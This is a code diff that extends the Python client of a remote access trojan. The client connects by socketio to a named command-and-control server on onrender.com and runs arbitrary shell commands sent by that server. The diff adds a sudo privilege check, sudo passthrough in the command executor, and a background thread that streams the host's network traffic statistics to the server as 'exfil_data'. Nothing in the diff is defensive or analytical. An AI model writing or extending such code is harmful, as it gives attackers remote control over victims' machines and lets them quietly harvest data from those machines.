@@ -6,6 +6,8 @@ import time
 import os
 from socketio import Client
 import netifaces
+import psutil
+import threading
 
 # Server settings
 SERVER_URL = "https://c2-backend-wily.onrender.com"
@@ -40,6 +42,58 @@ def get_network_info():
                 network_info[iface] = addr.get("addr", "Unknown")
     return network_info
 
+def can_run_sudo():
+    """Check if sudo can run by testing a harmless command."""
+    try:
+        result = subprocess.run("sudo -n true", shell=True, capture_output=True, text=True)
+        return result.returncode == 0
+    except subprocess.CalledProcessError as e:
+        print(f"[!] sudo test failed: {e}")
+        return False
+    except Exception as e:
+        print(f"[!] Error checking sudo: {e}")
+        return False
+
+def monitor_network(sio):
+    """Monitor network traffic and speed, emit data every 5 seconds."""
+    last_bytes_sent = psutil.net_io_counters().bytes_sent
+    last_bytes_recv = psutil.net_io_counters().bytes_recv
+    last_time = time.time()
+
+    while True:
+        time.sleep(5)  # Collect data every 5 seconds
+        try:
+            current_time = time.time()
+            current_io = psutil.net_io_counters()
+            bytes_sent = current_io.bytes_sent
+            bytes_recv = current_io.bytes_recv
+
+            # Calculate speed in Mbps
+            time_diff = current_time - last_time
+            sent_speed = ((bytes_sent - last_bytes_sent) * 8 / time_diff) / (1024 * 1024)  # Mbps
+            recv_speed = ((bytes_recv - last_bytes_recv) * 8 / time_diff) / (1024 * 1024)  # Mbps
+
+            # Prepare data
+            network_data = {
+                "type": "network_data",
+                "timestamp": current_time,
+                "bytes_sent": bytes_sent,
+                "bytes_recv": bytes_recv,
+                "sent_speed_mbps": round(sent_speed, 2),
+                "recv_speed_mbps": round(recv_speed, 2)
+            }
+
+            # Emit data to server
+            sio.emit('exfil_data', json.dumps(network_data))
+            print(f"[*] Sent network data: {network_data}")
+
+            # Update for next iteration
+            last_bytes_sent = bytes_sent
+            last_bytes_recv = bytes_recv
+            last_time = current_time
+        except Exception as e:
+            print(f"[!] Error monitoring network: {e}")
+
 def execute_command(command):
     """Execute a system command and return the output based on current directory."""
     try:
@@ -54,6 +108,12 @@ def execute_command(command):
             target_dir = os.path.normpath(target_dir)
             os.chdir(target_dir)
             return f"Changed directory to {os.getcwd()}"
+        elif command.strip().lower().startswith("sudo "):
+            if not can_run_sudo():
+                return "Error: sudo is blocked in this environment (no new privileges flag). Use non-root commands."
+            else:
+                result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
+                return result.stdout + result.stderr
         else:
             result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
             return result.stdout + result.stderr
@@ -75,6 +135,10 @@ def main():
             }
             sio.emit('exfil_data', json.dumps(exfil_data))
             print("[*] Exfiltrated data sent to RAT server")
+
+            # Start network monitoring in a separate thread
+            network_thread = threading.Thread(target=monitor_network, args=(sio,), daemon=True)
+            network_thread.start()
 
         @sio.event
         def disconnect():
